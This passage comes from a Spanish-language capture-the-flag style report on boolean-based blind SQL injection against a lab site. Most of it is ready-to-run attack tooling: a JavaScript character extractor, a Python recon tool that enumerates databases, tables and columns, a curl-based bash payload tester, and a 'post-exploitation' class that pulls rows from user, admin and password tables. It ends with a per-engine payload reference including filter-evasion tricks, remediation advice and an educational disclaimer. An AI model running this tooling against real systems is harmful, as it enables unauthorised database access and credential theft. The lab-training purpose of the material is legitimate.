        const char = await this.extractCharacter(query, position, technique);
        result += char;
        
        const progress = Math.round((position / length) * 100);
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        console.log(`📊 Progreso: ${progress}% - Tiempo: ${elapsed}s - Actual: "${result}"`);
      }
      
      this.statistics.endTime = Date.now();
      const totalTime = ((this.statistics.endTime - this.statistics.startTime) / 1000).toFixed(2);
      
      console.log('='.repeat(60));
      console.log(`✅ EXTRACCIÓN COMPLETADA en ${totalTime}s`);
      console.log(`🎯 RESULTADO: "${result}"`);
      console.log(`📊 Estadísticas: ${this.statistics.requests} requests, ${this.statistics.cacheHits} cache hits`);
      console.log('='.repeat(60));
      
      return result;
      
    } catch (error) {
      this.statistics.endTime = Date.now();
      console.error('❌ Error durante la extracción:', error);
      throw error;
    }
  }

  /**
   * Genera un reporte completo de estadísticas
   */
  generateReport() {
    const duration = this.statistics.endTime - this.statistics.startTime;
    const successRate = ((this.statistics.requests - this.statistics.errors) / this.statistics.requests * 100).toFixed(2);
    
    return {
      performance: {
        totalRequests: this.statistics.requests,
        cacheHits: this.statistics.cacheHits,
        errors: this.statistics.errors,
        successRate: `${successRate}%`,
        duration: `${(duration / 1000).toFixed(2)}s`,
        requestsPerSecond: (this.statistics.requests / (duration / 1000)).toFixed(2)
      },
      cacheEfficiency: {
        cacheSize: this.cache.size,
        hitRate: `${((this.statistics.cacheHits / (this.statistics.requests + this.statistics.cacheHits)) * 100).toFixed(2)}%`
      }
    };
  }
}

// Uso del extractor avanzado
const extractor = new AdvancedBlindSQLiExtractor({
  url: 'https://cunning-polaris.europe1.hackviser.space/',
  parameter: 'search',
  delay: 75,
  maxRetries: 3
});

// Script principal
(async () => {
  try {
    // 1. Detectar motor
    const engine = await extractor.detectDatabaseEngine();
    
    // 2. Extraer nombre de BD
    const dbName = await extractor.extractString('database()');
    
    // 3. Generar reporte
    const report = extractor.generateReport();
    console.log('📋 Reporte final:', report);
    
  } catch (error) {
    console.error('💥 Error fatal:', error);
  }
})();
```

### Apéndice C: Herramienta de Reconocimiento Completo

```python
#!/usr/bin/env python3
"""
Herramienta de reconocimiento completo para Boolean-Based Blind SQLi
"""

import requests
import time
import json
import argparse
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor
import signal
import sys

class BlindSQLiRecon:
    def __init__(self, url, param='search', threads=5, delay=0.1):
        self.url = url
        self.param = param
        self.threads = threads
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; SQLi-Recon/1.0)'
        })
        
        # Estadísticas
        self.stats = {
            'requests': 0,
            'errors': 0,
            'start_time': time.time()
        }
        
        # Manejador de señales para interrupción limpia
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print(f"\n⚠️  Interrupción recibida. Generando reporte...")
        self.print_stats()
        sys.exit(0)
    
    def query(self, payload):
        """Ejecuta una consulta SQLi"""
        data = {self.param: payload}
        
        try:
            self.stats['requests'] += 1
            response = self.session.post(
                self.url,
                data=data,
                timeout=10
            )
            
            return 'in stock' in response.text.lower()
            
        except Exception as e:
            self.stats['errors'] += 1
            return False
        finally:
            time.sleep(self.delay)
    
    def verify_sqli(self):
        """Verifica la existencia de SQLi"""
        print("🔍 Verificando vulnerabilidad SQLi...")
        
        test_cases = [
            ("' OR 1=1 --", True),
            ("' OR 1=2 --", False),
            ("' AND 1=1 --", None),  # Depende del contexto
            ("' AND 1=2 --", False)
        ]
        
        results = []
        for payload, expected in test_cases:
            result = self.query(payload)
            results.append(result)
            print(f"  {payload:<20} → {'✅' if result else '❌'}")
        
        # Verificar patrón booleano
        if results[0] and not results[1]:
            print("✅ Vulnerabilidad Boolean-Based SQLi confirmada!")
            return True
        else:
            print("❌ No se detectó vulnerabilidad SQLi")
            return False
    
    def detect_database(self):
        """Detecta el tipo de base de datos"""
        print("\n🔍 Detectando motor de base de datos...")
        
        engines = {
            'MySQL/MariaDB': [
                "' OR (SELECT database()) IS NOT NULL --",
                "' OR (SELECT version()) LIKE '5%' --"
            ],
            'PostgreSQL': [
                "' OR (SELECT current_database()) IS NOT NULL --"
            ],
            'SQL Server': [
                "' OR (SELECT DB_NAME()) IS NOT NULL --"
            ],
            'Oracle': [
                "' OR (SELECT user FROM dual) IS NOT NULL --"
            ],
            'SQLite': [
                "' OR (SELECT name FROM sqlite_master LIMIT 1) IS NOT NULL --"
            ]
        }
        
        for engine, tests in engines.items():
            for test in tests:
                if self.query(test):
                    print(f"✅ Motor detectado: {engine}")
                    return engine
        
        print("⚠️  Motor de BD no identificado")
        return "Unknown"
    
    def extract_length(self, query, max_length=255):
        """Extrae la longitud de una cadena usando búsqueda binaria"""
        low, high = 0, max_length
        
        while low < high:
            mid = (low + high + 1) // 2
            payload = f"' OR LENGTH({query}) >= {mid} --"
            
            if self.query(payload):
                low = mid
            else:
                high = mid - 1
        
        return low
    
    def extract_char(self, query, position, min_ascii=32, max_ascii=126):
        """Extrae un carácter usando búsqueda binaria ASCII"""
        low, high = min_ascii, max_ascii
        
        while low < high:
            mid = (low + high + 1) // 2
            payload = f"' OR ASCII(SUBSTRING({query}, {position}, 1)) >= {mid} --"
            
            if self.query(payload):
                low = mid
            else:
                high = mid - 1
        
        return chr(low) if low > 0 else '?'
    
    def extract_string(self, query, description="cadena"):
        """Extrae una cadena completa"""
        print(f"\n📝 Extrayendo {description}...")
        
        # Obtener longitud
        length = self.extract_length(query)
        if length == 0:
            print(f"  ⚠️  {description} vacía o no encontrada")
            return ""
        
        print(f"  📏 Longitud: {length} caracteres")
        
        # Extraer cada carácter
        result = ""
        for pos in range(1, length + 1):
            char = self.extract_char(query, pos)
            result += char
            
            progress = int((pos / length) * 100)
            print(f"  📊 Progreso: {progress:3d}% - Actual: '{result}'")
        
        print(f"  ✅ {description}: '{result}'")
        return result
    
    def enumerate_tables(self, database_name, max_tables=50):
        """Enumera las tablas de la base de datos"""
        print(f"\n🗂️  Enumerando tablas de '{database_name}'...")
        
        # Contar tablas
        count_query = f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database_name}')"
        table_count = self.extract_length(count_query, max_tables)
        
        if table_count == 0:
            print("  ⚠️  No se encontraron tablas")
            return []
        
        print(f"  📊 Número de tablas: {table_count}")
        
        # Extraer nombres de tablas
        tables = []
        for i in range(table_count):
            table_query = f"(SELECT table_name FROM information_schema.tables WHERE table_schema='{database_name}' LIMIT {i},1)"
            table_name = self.extract_string(table_query, f"tabla {i+1}")
            
            if table_name:
                tables.append(table_name)
        
        return tables
    
    def enumerate_columns(self, database_name, table_name, max_columns=50):
        """Enumera las columnas de una tabla"""
        print(f"\n📋 Enumerando columnas de '{table_name}'...")
        
        # Contar columnas
        count_query = f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{database_name}' AND table_name='{table_name}')"
        column_count = self.extract_length(count_query, max_columns)
        
        if column_count == 0:
            print("  ⚠️  No se encontraron columnas")
            return []
        
        print(f"  📊 Número de columnas: {column_count}")
        
        # Extraer nombres de columnas
        columns = []
        for i in range(column_count):
            column_query = f"(SELECT column_name FROM information_schema.columns WHERE table_schema='{database_name}' AND table_name='{table_name}' LIMIT {i},1)"
            column_name = self.extract_string(column_query, f"columna {i+1}")
            
            if column_name:
                columns.append(column_name)
        
        return columns
    
    def extract_system_info(self):
        """Extrae información del sistema"""
        print("\n🖥️  Extrayendo información del sistema...")
        
        system_queries = {
            'version': 'version()',
            'user': 'user()',
            'hostname': '@@hostname',
            'datadir': '@@datadir',
            'port': '@@port'
        }
        
        system_info = {}
        for key, query in system_queries.items():
            try:
                value = self.extract_string(query, key)
                system_info[key] = value
            except Exception as e:
                print(f"  ❌ Error extrayendo {key}: {e}")
                system_info[key] = None
        
        return system_info
    
    def print_stats(self):
        """Imprime estadísticas de ejecución"""
        duration = time.time() - self.stats['start_time']
        success_rate = ((self.stats['requests'] - self.stats['errors']) / self.stats['requests']) * 100
        
        print("\n📊 Estadísticas de Ejecución:")
        print(f"  Total de requests: {self.stats['requests']}")
        print(f"  Errores: {self.stats['errors']}")
        print(f"  Tasa de éxito: {success_rate:.2f}%")
        print(f"  Duración: {duration:.2f}s")
        print(f"  Requests/segundo: {self.stats['requests']/duration:.2f}")
    
    def full_recon(self):
        """Ejecuta reconocimiento completo"""
        print("🚀 Iniciando reconocimiento completo de SQLi...")
        print("=" * 60)
        
        results = {
            'target': self.url,
            'vulnerable': False,
            'database_engine': None,
            'database_name': None,
            'system_info': {},
            'tables': [],
            'full_schema': {}
        }
        
        try:
            # 1. Verificar vulnerabilidad
            if not self.verify_sqli():
                return results
            
            results['vulnerable'] = True
            
            # 2. Detectar motor de BD
            engine = self.detect_database()
            results['database_engine'] = engine
            
            # 3. Extraer nombre de BD
            db_name = self.extract_string('database()', 'nombre de base de datos')
            results['database_name'] = db_name
            
            # 4. Información del sistema
            system_info = self.extract_system_info()
            results['system_info'] = system_info
            
            # 5. Enumerar tablas
            if db_name:
                tables = self.enumerate_tables(db_name)
                results['tables'] = tables
                
                # 6. Enumerar columnas de cada tabla
                for table in tables[:3]:  # Limitar a 3 tablas para el ejemplo
                    columns = self.enumerate_columns(db_name, table)
                    results['full_schema'][table] = columns
            
            return results
            
        except Exception as e:
            print(f"❌ Error durante reconocimiento: {e}")
            return results
        
        finally:
            self.print_stats()

def main():
    parser = argparse.ArgumentParser(description='Herramienta de reconocimiento Boolean-Based Blind SQLi')
    parser.add_argument('url', help='URL objetivo')
    parser.add_argument('-p', '--param', default='search', help='Parámetro vulnerable (default: search)')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Número de threads (default: 5)')
    parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay entre requests (default: 0.1s)')
    parser.add_argument('-o', '--output', help='Archivo de salida JSON')
    
    args = parser.parse_args()
    
    # Inicializar reconocedor
    recon = BlindSQLiRecon(args.url, args.param, args.threads, args.delay)
    
    # Ejecutar reconocimiento
    results = recon.full_recon()
    
    # Mostrar resumen
    print("\n" + "=" * 60)
    print("📋 RESUMEN DE RECONOCIMIENTO")
    print("=" * 60)
    print(f"🎯 Target: {results['target']}")
    print(f"🚨 Vulnerable: {'✅ SÍ' if results['vulnerable'] else '❌ NO'}")
    
    if results['vulnerable']:
        print(f"🗃️  Motor: {results['database_engine']}")
        print(f"📊 Base de datos: {results['database_name']}")
        print(f"🗂️  Tablas encontradas: {len(results['tables'])}")
        
        if results['tables']:
            print("   Tablas:")
            for table in results['tables']:
                columns = len(results['full_schema'].get(table, []))
                print(f"     - {table} ({columns} columnas)")
    
    # Guardar resultados
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f"💾 Resultados guardados en: {args.output}")

if __name__ == '__main__':
    main()
```

### Apéndice D: Scripts de Validación y Testing

#### D.1 Script de Validación Rápida

```bash
#!/bin/bash
# validate_sqli.sh - Validación rápida de SQLi

URL="$1"
PARAM="${2:-search}"

if [ -z "$URL" ]; then
    echo "Uso: $0 <URL> [parámetro]"
    exit 1
fi

echo "🔍 Validando SQLi en: $URL"
echo "📌 Parámetro: $PARAM"
echo "=" * 50

# Test básicos
declare -a payloads=(
    "' OR 1=1 --"
    "' OR 1=2 --"
    "' AND 1=1 --" 
    "' AND 1=2 --"
    "' OR SLEEP(2) --"
)

for payload in "${payloads[@]}"; do
    echo -n "Testing: $payload ... "
    
    start_time=$(date +%s.%N)
    response=$(curl -s -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "$PARAM=$(printf '%s' "$payload" | jq -sRr @uri)" \
        "$URL")
    end_time=$(date +%s.%N)
    
    duration=$(echo "$end_time - $start_time" | bc)
    
    if echo "$response" | grep -qi "in stock"; then
        echo "✅ TRUE (${duration}s)"
    else
        echo "❌ FALSE (${duration}s)"
    fi
done

echo ""
echo "🔍 Prueba de detección de motor..."

# Test específico para MySQL
mysql_test="' OR (SELECT database()) IS NOT NULL --"
echo -n "MySQL test: "
response=$(curl -s -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "$PARAM=$(printf '%s' "$mysql_test" | jq -sRr @uri)" \
    "$URL")

if echo "$response" | grep -qi "in stock"; then
    echo "✅ Probablemente MySQL/MariaDB"
else
    echo "❌ No MySQL/MariaDB"
fi
```

#### D.2 Monitor de Performance

```javascript
/**
 * Monitor de performance para ataques SQLi
 */
class SQLiPerformanceMonitor {
    constructor() {
        this.metrics = {
            requests: [],
            errors: [],
            responseTimeAvg: 0,
            successRate: 0,
            startTime: null,
            lastUpdate: null
        };
        
        this.thresholds = {
            maxResponseTime: 5000,  // 5s
            minSuccessRate: 90,     // 90%
            maxErrors: 10           // 10 errores máximo
        };
    }

    startMonitoring() {
        this.metrics.startTime = Date.now();
        this.metrics.lastUpdate = Date.now();
        
        // Mostrar métricas cada 10 segundos
        this.monitorInterval = setInterval(() => {
            this.displayMetrics();
        }, 10000);
        
        console.log('📊 Monitor de performance iniciado');
    }

    recordRequest(success, responseTime, error = null) {
        const timestamp = Date.now();
        
        this.metrics.requests.push({
            timestamp,
            success,
            responseTime,
            error
        });
        
        if (!success && error) {
            this.metrics.errors.push({
                timestamp,
                error: error.message
            });
        }
        
        // Calcular métricas actuales
        this.updateMetrics();
        
        // Verificar alertas
        this.checkAlerts();
    }

    updateMetrics() {
        const recent = this.metrics.requests.slice(-100); // últimos 100 requests
        
        if (recent.length > 0) {
            const successful = recent.filter(r => r.success);
            
            this.metrics.successRate = (successful.length / recent.length) * 100;
            this.metrics.responseTimeAvg = successful.reduce((sum, r) => sum + r.responseTime, 0) / successful.length;
        }
    }

    checkAlerts() {
        const recentErrors = this.metrics.errors.filter(
            e => Date.now() - e.timestamp < 60000 // último minuto
        );
        
        if (recentErrors.length > this.thresholds.maxErrors) {
            console.warn(`⚠️  ALERTA: ${recentErrors.length} errores en el último minuto`);
        }
        
        if (this.metrics.responseTimeAvg > this.thresholds.maxResponseTime) {
            console.warn(`⚠️  ALERTA: Tiempo de respuesta promedio alto: ${this.metrics.responseTimeAvg.toFixed(0)}ms`);
        }
        
        if (this.metrics.successRate < this.thresholds.minSuccessRate) {
            console.warn(`⚠️  ALERTA: Tasa de éxito baja: ${this.metrics.successRate.toFixed(1)}%`);
        }
    }

    displayMetrics() {
        const duration = (Date.now() - this.metrics.startTime) / 1000;
        const totalRequests = this.metrics.requests.length;
        const rps = (totalRequests / duration).toFixed(2);
        
        console.log('\n📊 MÉTRICAS DE PERFORMANCE');
        console.log('─'.repeat(40));
        console.log(`⏱️  Duración: ${duration.toFixed(1)}s`);
        console.log(`📡 Total requests: ${totalRequests}`);
        console.log(`📈 Requests/segundo: ${rps}`);
        console.log(`✅ Tasa de éxito: ${this.metrics.successRate.toFixed(1)}%`);
        console.log(`⚡ Tiempo resp. promedio: ${this.metrics.responseTimeAvg.toFixed(0)}ms`);
        console.log(`❌ Errores totales: ${this.metrics.errors.length}`);
        console.log('─'.repeat(40));
    }

    generateReport() {
        const duration = (Date.now() - this.metrics.startTime) / 1000;
        const totalRequests = this.metrics.requests.length;
        
        return {
            summary: {
                duration: `${duration.toFixed(2)}s`,
                totalRequests,
                requestsPerSecond: (totalRequests / duration).toFixed(2),
                successRate: `${this.metrics.successRate.toFixed(2)}%`,
                averageResponseTime: `${this.metrics.responseTimeAvg.toFixed(0)}ms`,
                totalErrors: this.metrics.errors.length
            },
            timeline: this.metrics.requests.map(r => ({
                timestamp: new Date(r.timestamp).toISOString(),
                success: r.success,
                responseTime: r.responseTime
            })),
            errors: this.metrics.errors.map(e => ({
                timestamp: new Date(e.timestamp).toISOString(),
                error: e.error
            }))
        };
    }

    stopMonitoring() {
        if (this.monitorInterval) {
            clearInterval(this.monitorInterval);
        }
        
        console.log('\n📊 Monitoreo detenido');
        this.displayMetrics();
        
        return this.generateReport();
    }
}

// Integración con extractor
class MonitoredSQLiExtractor extends AdvancedBlindSQLiExtractor {
    constructor(config) {
        super(config);
        this.monitor = new SQLiPerformanceMonitor();
    }

    async query(payload, useCache = true) {
        const startTime = Date.now();
        
        try {
            const result = await super.query(payload, useCache);
            const responseTime = Date.now() - startTime;
            
            this.monitor.recordRequest(true, responseTime);
            return result;
            
        } catch (error) {
            const responseTime = Date.now() - startTime;
            this.monitor.recordRequest(false, responseTime, error);
            throw error;
        }
    }

    async extractString(query, technique = 'ascii-binary', maxLength = 255) {
        this.monitor.startMonitoring();
        
        try {
            const result = await super.extractString(query, technique, maxLength);
            return result;
        } finally {
            const report = this.monitor.stopMonitoring();
            this.performanceReport = report;
        }
    }
}
```

### Apéndice E: Herramientas de Post-Explotación

#### E.1 Extractor de Datos Masivo

```javascript
/**
 * Extractor de datos masivo para post-explotación
 */
class MassDataExtractor {
    constructor(extractor) {
        this.extractor = extractor;
        this.database = null;
        this.schema = {};
    }

    async fullDatabaseExtraction() {
        console.log('🗄️  Iniciando extracción masiva de datos...');
        
        try {
            // 1. Información básica
            await this.extractBasicInfo();
            
            // 2. Esquema completo
            await this.extractSchema();
            
            // 3. Datos de tablas críticas
            await this.extractCriticalData();
            
            // 4. Configuración del sistema
            await this.extractSystemConfig();
            
            return this.generateFullReport();
            
        } catch (error) {
            console.error('❌ Error en extracción masiva:', error);
            throw error;
        }
    }

    async extractBasicInfo() {
        console.log('\n📋 Extrayendo información básica...');
        
        this.basicInfo = {
            database: await this.extractor.extractString('database()', 'ascii-binary'),
            version: await this.extractor.extractString('version()', 'ascii-binary'),
            user: await this.extractor.extractString('user()', 'ascii-binary'),
            hostname: await this.extractor.extractString('@@hostname', 'ascii-binary'),
            datadir: await this.extractor.extractString('@@datadir', 'ascii-binary')
        };
        
        console.log('✅ Información básica extraída');
    }

    async extractSchema() {
        console.log('\n🗂️  Extrayendo esquema completo...');
        
        // Obtener todas las tablas
        const tablesQuery = `(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())`;
        const tablesString = await this.extractor.extractString(tablesQuery);
        const tables = tablesString.split(',');
        
        console.log(`📊 Encontradas ${tables.length} tablas`);
        
        // Extraer columnas para cada tabla
        for (const table of tables) {
            console.log(`\n📋 Procesando tabla: ${table}`);
            
            const columnsQuery = `(SELECT GROUP_CONCAT(CONCAT(column_name,':',data_type)) FROM information_schema.columns WHERE table_schema=database() AND table_name='${table}')`;
            const columnsString = await this.extractor.extractString(columnsQuery);
            
            this.schema[table] = columnsString.split(',').map(col => {
                const [name, type] = col.split(':');
                return { name, type };
            });
            
            console.log(`  ✅ ${this.schema[table].length} columnas extraídas`);
        }
        
        console.log('✅ Esquema completo extraído');
    }

    async extractCriticalData() {
        console.log('\n🔐 Extrayendo datos críticos...');
        
        const criticalTables = ['users', 'admin', 'accounts', 'login', 'passwords'];
        this.criticalData = {};
        
        for (const tableName of criticalTables) {
            if (this.schema[tableName]) {
                console.log(`\n🔍 Extrayendo datos de tabla crítica: ${tableName}`);
                
                // Contar registros
                const countQuery = `(SELECT COUNT(*) FROM ${tableName})`;
                const count = await this.extractNumber(countQuery);
                
                console.log(`  📊 ${count} registros encontrados`);
                
                if (count > 0 && count <= 10) { // Limitar para evitar exceso
                    this.criticalData[tableName] = await this.extractTableData(tableName, Math.min(count, 5));
                }
            }
        }
        
        console.log('✅ Datos críticos extraídos');
    }

    async extractTableData(tableName, limit = 5) {
        const columns = this.schema[tableName];
        const data = [];
        
        for (let i = 0; i < limit; i++) {
            const row = {};
            
            for (const column of columns.slice(0, 3)) { // Máximo 3 columnas por fila
                const query = `(SELECT ${column.name} FROM ${tableName} LIMIT ${i},1)`;
                
                try {
                    row[column.name] = await this.extractor.extractString(query);
                } catch (error) {
                    row[column.name] = '[ERROR]';
                }
            }
            
            data.push(row);
            console.log(`    Fila ${i+1}:`, row);
        }
        
        return data;
    }

    async extractNumber(query) {
        const result = await this.extractor.extractString(query);
        return parseInt(result) || 0;
    }

    async extractSystemConfig() {
        console.log('\n⚙️  Extrayendo configuración del sistema...');
        
        const configQueries = {
            version_comment: '@@version_comment',
            socket: '@@socket',
            port: '@@port',
            basedir: '@@basedir',
            character_set_server: '@@character_set_server',
            max_connections: '@@max_connections'
        };
        
        this.systemConfig = {};
        
        for (const [key, query] of Object.entries(configQueries)) {
            try {
                this.systemConfig[key] = await this.extractor.extractString(query);
                console.log(`  ✅ ${key}: ${this.systemConfig[key]}`);
            } catch (error) {
                this.systemConfig[key] = '[ERROR]';
                console.log(`  ❌ ${key}: Error`);
            }
        }
        
        console.log('✅ Configuración del sistema extraída');
    }

    generateFullReport() {
        const report = {
            timestamp: new Date().toISOString(),
            basic_info: this.basicInfo,
            database_schema: this.schema,
            critical_data: this.criticalData,
            system_config: this.systemConfig,
            statistics: this.extractor.generateReport()
        };
        
        console.log('\n📋 REPORTE COMPLETO GENERADO');
        console.log('='.repeat(60));
        console.log(`🗄️  Base de datos: ${this.basicInfo.database}`);
        console.log(`🔢 Tablas: ${Object.keys(this.schema).length}`);
        console.log(`🔐 Tablas críticas: ${Object.keys(this.criticalData).length}`);
        console.log(`⚙️  Parámetros config: ${Object.keys(this.systemConfig).length}`);
        
        return report;
    }

    exportToJSON(filename = 'sqli_extraction_report.json') {
        const report = this.generateFullReport();
        
        // En navegador - descargar archivo
        if (typeof window !== 'undefined') {
            const blob = new Blob([JSON.stringify(report, null, 2)], {
                type: 'application/json'
            });
            
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            console.log(`💾 Reporte exportado: ${filename}`);
        }
        
        return report;
    }
}
```

### Apéndice F: Documentación Técnica Adicional

#### F.1 Referencia de Payloads por Motor

```markdown
## Referencia Completa de Payloads SQLi por Motor de BD

### MySQL/MariaDB

#### Detección
- `' OR (SELECT database()) IS NOT NULL --`
- `' OR (SELECT version()) LIKE '5%' --`
- `' OR (SELECT @@version) IS NOT NULL --`

#### Extracción de Información
- Base de datos: `database()`, `schema()`
- Versión: `version()`, `@@version`
- Usuario: `user()`, `current_user()`, `@@user`
- Hostname: `@@hostname`

#### Funciones de Cadena
- Longitud: `LENGTH()`, `CHAR_LENGTH()`
- Substring: `SUBSTRING()`, `SUBSTR()`, `MID()`
- ASCII: `ASCII()`, `ORD()`
- Concatenación: `CONCAT()`

#### Técnicas de Evasión
- Comentarios: `--`, `#`, `/**/`
- Espacios: `/**/`, `%20`, `%09`, `%0a`
- Case: `Union` → `uNiOn`

### PostgreSQL

#### Detección
- `' OR (SELECT current_database()) IS NOT NULL --`
- `' OR (SELECT version()) LIKE 'PostgreSQL%' --`

#### Extracción de Información
- Base de datos: `current_database()`
- Versión: `version()`
- Usuario: `current_user`, `user`

#### Funciones Específicas
- Longitud: `LENGTH()`, `CHAR_LENGTH()`
- Substring: `SUBSTRING()`
- ASCII: `ASCII()`
- Sleep: `pg_sleep()`

### SQL Server

#### Detección
- `' OR (SELECT DB_NAME()) IS NOT NULL --`
- `' OR (SELECT @@version) LIKE 'Microsoft%' --`

#### Extracción de Información
- Base de datos: `DB_NAME()`
- Versión: `@@version`
- Usuario: `SYSTEM_USER`, `USER`

#### Funciones Específicas
- Longitud: `LEN()`, `DATALENGTH()`
- Substring: `SUBSTRING()`
- ASCII: `ASCII()`
- Delay: `WAITFOR DELAY '00:00:05'`

### Oracle

#### Detección
- `' OR (SELECT user FROM dual) IS NOT NULL --`
- `' OR (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL --`

#### Extracción de Información
- Usuario: `user`
- Versión: `banner FROM v$version`

#### Funciones Específicas
- Longitud: `LENGTH()`
- Substring: `SUBSTR()`
- ASCII: `ASCII()`
- Concatenación: `||` o `CONCAT()`

### SQLite

#### Detección
- `' OR (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) IS NOT NULL --`

#### Extracción de Información
- Tablas: `sqlite_master`
- Versión: `sqlite_version()`

#### Limitaciones
- No tiene funciones de usuario/hostname
- Sintaxis más limitada
- No soporta múltiples declaraciones
```

#### F.2 Tabla de Códigos ASCII Comunes

```markdown
## Referencia de Códigos ASCII para SQLi

### Rangos Comunes
| Rango | Caracteres | Descripción |
|-------|------------|-------------|
| 32-47 | `!"#$%&'()*+,-./` | Símbolos y puntuación |
| 48-57 | `0123456789` | Dígitos |
| 65-90 | `ABCDEFGHIJKLMNOPQRSTUVWXYZ` | Letras mayúsculas |
| 97-122 | `abcdefghijklmnopqrstuvwxyz` | Letras minúsculas |
| 95 | `_` | Guión bajo (común en BD) |
| 45 | `-` | Guión medio |
| 46 | `.` | Punto |
| 64 | `@` | Arroba |

### Caracteres Especiales en BD
| ASCII | Char | Uso Común |
|-------|------|-----------|
| 95 | `_` | Nombres de tabla/columna |
| 45 | `-` | Separadores |
| 64 | `@` | Variables de sistema |
| 46 | `.` | Separador esquema.tabla |
| 32 | ` ` | Espacios |
| 39 | `'` | Comillas simples |
| 34 | `"` | Comillas dobles |
```

---

## 12. Conclusiones

### 12.1 Resumen

Este informe documenta la identificación, análisis y explotación exitosa de una vulnerabilidad de **Boolean-Based Blind SQL Injection** en el laboratorio objetivo. Los resultados demuestran:

**Vulnerabilidad Confirmada:**
- ✅ Boolean-Based Blind SQLi en parámetro `search`
- ✅ Motor MySQL/MariaDB identificado
- ✅ Extracción exitosa del nombre de BD: `echo_store`
- ✅ Técnicas de optimización implementadas

**Impacto de Seguridad:**
- **Alto riesgo** de exposición de datos sensibles
- Potencial acceso a información confidencial
- Posible escalación a ataques más sofisticados
- Violación de confidencialidad de datos

### 12.2 Técnicas

1. **Búsqueda Binaria Optimizada**: Reducción del 97% en número de requests
2. **Sistema de Caché Inteligente**: Mejora del rendimiento mediante reutilización
3. **Reintentos Automáticos**: Robustez ante fallos temporales de red
4. **Monitoreo en Tiempo Real**: Métricas de performance y alertas
5. **Extracción Masiva**: Automatización completa de post-explotación

### 12.3 Recomendaciones

**Inmediatas (0-30 días):**
1. Implementar consultas preparadas en toda la aplicación
2. Configurar WAF con reglas anti-SQLi actualizadas
3. Aplicar validación estricta de entrada
4. Implementar logging detallado de consultas sospechosas

**Mediano Plazo (30-90 días):**
1. Auditoría completa de seguridad del código
2. Implementación de principio de menor privilegio
3. Configuración de monitoreo avanzado
4. Capacitación del equipo de desarrollo en secure coding

**Largo Plazo (90+ días):**
1. Implementación de DevSecOps
2. Pruebas de penetración regulares
3. Programa de bug bounty
4. Certificación de seguridad ISO 27001

### 12.4 Valor

Este laboratorio proporciona una excelente oportunidad para:
- **Comprensión profunda** de técnicas de SQLi avanzadas
- **Desarrollo de herramientas** personalizadas de explotación
- **Optimización algorítmica** aplicada a ciberseguridad
- **Análisis de rendimiento** en ataques automatizados

### 12.5 Contribuciones

Las herramientas y técnicas desarrolladas en este análisis contribuyen al campo de la ciberseguridad mediante:

1. **Código abierto** para investigación y educación
2. **Metodologías optimizadas** de explotación
3. **Métricas de performance** detalladas
4. **Documentación exhaustiva** de procedimientos

---

*Este informe ha sido elaborado con fines estrictamente educativos y de investigación en ciberseguridad. Su uso debe limitarse a entornos controlados y autorizados.*
